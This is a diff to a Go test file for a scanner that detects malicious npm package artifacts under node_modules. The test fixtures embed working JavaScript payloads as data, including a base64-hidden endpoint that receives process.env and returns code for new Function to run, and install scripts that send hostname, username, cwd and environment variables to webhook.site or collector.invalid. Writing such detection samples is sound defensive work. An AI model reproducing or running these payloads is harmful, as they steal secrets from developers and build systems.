@@ -1681,8 +1681,8 @@ chmodSync(target, 0o755);`)
 }
 
 // TestScan_AmazonInspectorLatestCriticalNPMArtifactsUnderNodeModules proves the
-// bounded walker reaches expect-dotenv, @httttt/mcp-demo, mcp-dev-toolkit,
-// express-session-handler, and chai-as-soul under npm and pnpm.
+// bounded walker reaches reviewed critical package-root artifacts under npm
+// and pnpm without opening unrelated node_modules trees.
 func TestScan_AmazonInspectorLatestCriticalNPMArtifactsUnderNodeModules(t *testing.T) {
 	tests := []struct {
 		name string
@@ -1738,6 +1738,36 @@ func TestScan_AmazonInspectorLatestCriticalNPMArtifactsUnderNodeModules(t *testi
 			name: "chai as soul pnpm",
 			rel:  filepath.Join("node_modules", ".pnpm", "chai-as-soul@2.3.5", "node_modules", "chai-as-soul", "lib", "initializeCaller.js"),
 			raw:  []byte(`(async () => { const configEndpoint = Buffer.from("aHR0cHM6Ly9pcGNoZWNrLWhhc2hlZC52ZXJjZWwuYXBwL2FwaS9hdXRoLzZjMWQ2MGQzNTg1MmVmMGMwNWRm", "base64").toString(); const response = await axios.post(configEndpoint, process.env, { headers: { "x-secret-header": "campaign" } }); new Function("require", response.data)(require); })();`),
+		},
+		{
+			name: "gfe lx watcher npm",
+			rel:  filepath.Join("node_modules", "@gfe", "lx-watcher", "install.js"),
+			raw:  []byte(`const { hostname, userInfo } = require("os"); const https = require("https"); const payload = JSON.stringify({ host: hostname(), user: userInfo().username, cwd: process.cwd() }); https.request({ host: "webhook.site", path: "/df384ffa-1094-4bbf-a202-e8b345b3ed18/gfe", method: "POST" }).end(payload);`),
+		},
+		{
+			name: "gfe lx watcher pnpm",
+			rel:  filepath.Join("node_modules", ".pnpm", "@gfe+lx-watcher@1.5.4", "node_modules", "@gfe", "lx-watcher", "install.js"),
+			raw:  []byte(`const { hostname, userInfo } = require("os"); const https = require("https"); const payload = JSON.stringify({ host: hostname(), user: userInfo().username, cwd: process.cwd() }); https.request({ host: "webhook.site", path: "/df384ffa-1094-4bbf-a202-e8b345b3ed18/gfe", method: "POST" }).end(payload);`),
+		},
+		{
+			name: "fuel react npm",
+			rel:  filepath.Join("node_modules", "fuel-react", "postinstall.js"),
+			raw:  []byte(`const os = require("os"); const https = require("https"); const payload = JSON.stringify({ hostname: os.hostname(), env: process.env }); const req = https.request({ method: "POST", hostname: "collector.invalid" }); req.end(payload);`),
+		},
+		{
+			name: "fuel react pnpm",
+			rel:  filepath.Join("node_modules", ".pnpm", "fuel-react@91.0.0", "node_modules", "fuel-react", "postinstall.js"),
+			raw:  []byte(`const os = require("os"); const https = require("https"); const payload = JSON.stringify({ hostname: os.hostname(), env: process.env }); const req = https.request({ method: "POST", hostname: "collector.invalid" }); req.end(payload);`),
+		},
+		{
+			name: "lumen pages npm",
+			rel:  filepath.Join("node_modules", "lumen-pages-community", "dc.js"),
+			raw:  []byte(`const os = require("os"); const https = require("https"); const info = { host: os.hostname(), user: os.userInfo().username, cwd: process.cwd(), platform: process.platform, ci: process.env.CI }; https.get("https://webhook.site/b00492c6-27ba-4ea0-a9cb-dd50b3770250/dc?" + new URLSearchParams(info));`),
+		},
+		{
+			name: "lumen pages pnpm",
+			rel:  filepath.Join("node_modules", ".pnpm", "lumen-pages-community@9.9.9", "node_modules", "lumen-pages-community", "dc.js"),
+			raw:  []byte(`const os = require("os"); const https = require("https"); const info = { host: os.hostname(), user: os.userInfo().username, cwd: process.cwd(), platform: process.platform, ci: process.env.CI }; https.get("https://webhook.site/b00492c6-27ba-4ea0-a9cb-dd50b3770250/dc?" + new URLSearchParams(info));`),
 		},
 	}
 	for _, tc := range tests {
